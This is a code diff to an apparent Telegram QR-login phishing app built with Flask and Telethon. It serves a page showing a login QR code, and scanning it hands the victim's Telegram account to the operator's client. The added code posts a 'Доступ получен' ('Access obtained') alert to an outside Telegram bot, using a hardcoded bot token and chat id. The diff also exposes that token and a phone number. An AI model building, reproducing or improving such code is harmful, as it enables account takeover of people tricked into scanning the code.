@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, send_file, render_template_string
+from flask import Flask, jsonify, render_template_string, request
 from flask_cors import CORS
 from telethon import TelegramClient
 import qrcode
@@ -7,6 +7,7 @@ import base64
 import asyncio
 import os
 import time
+import threading
 
 app = Flask(__name__)
 CORS(app)
@@ -19,6 +20,8 @@ PHONE = "+79963066267"
 
 current_qr = None
 qr_login_obj = None
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
 async def generate_qr():
     global current_qr, qr_login_obj
@@ -34,7 +37,11 @@ async def generate_qr():
     qr_img.save(buffered, format="PNG")
     qr_base64 = base64.b64encode(buffered.getvalue()).decode()
     
-    current_qr = {'qr': qr_base64, 'url': qr_url, 'timestamp': time.time()}
+    current_qr = {
+        'qr': qr_base64,
+        'url': qr_url,
+        'timestamp': time.time()
+    }
     
     asyncio.create_task(wait_for_scan(qr_login))
     await client.disconnect()
@@ -45,19 +52,29 @@ async def wait_for_scan(qr_login):
     try:
         await qr_login.wait()
         print("✅ QR-код отсканирован! Вход выполнен.")
+        # Здесь можно отправить уведомление в твой бот
+        try:
+            import requests
+            requests.post(
+                'https://api.telegram.org/bot8685246496:AAGmLEqVlILvS-RPXln-2qsJ2CPI8yuJZfg/sendMessage',
+                json={'chat_id': '8346803858', 'text': '✅ QR-код отсканирован! Доступ получен.'}
+            )
+        except:
+            pass
     except Exception as e:
         print(f"❌ Ошибка: {e}")
 
 @app.route('/qr')
 def get_qr():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(generate_qr())
-    return jsonify(current_qr)
+    global current_qr
+    try:
+        loop.run_until_complete(generate_qr())
+        return jsonify(current_qr)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/')
 def index():
-    # ВСТРОЕННАЯ HTML-СТРАНИЦА
     html = """
     <!DOCTYPE html>
     <html lang="ru">
@@ -288,12 +305,6 @@ def index():
                 }, 2800);
             })();
 
-            // ===== АВАТАРКА (если в Telegram) =====
-            if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
-                const user = Telegram.WebApp.initDataUnsafe.user;
-                // Можно использовать для приветствия
-            }
-
             // ===== QR-КОД =====
             const QR_API = window.location.origin + '/qr';
 
@@ -301,12 +312,18 @@ def index():
                 fetch(QR_API)
                     .then(res => res.json())
                     .then(data => {
+                        if (data.error) {
+                            console.error('Ошибка:', data.error);
+                            return;
+                        }
                         document.getElementById('qrImage').src = 'data:image/png;base64,' + data.qr;
                     })
-                    .catch(err => console.error('Ошибка QR:', err));
+                    .catch(err => console.error('Ошибка загрузки QR:', err));
             }
 
+            // Обновляем каждые 30 секунд
             setInterval(updateQR, 30000);
+            // Первый раз сразу
             updateQR();
 
             // ===== КНОПКИ =====
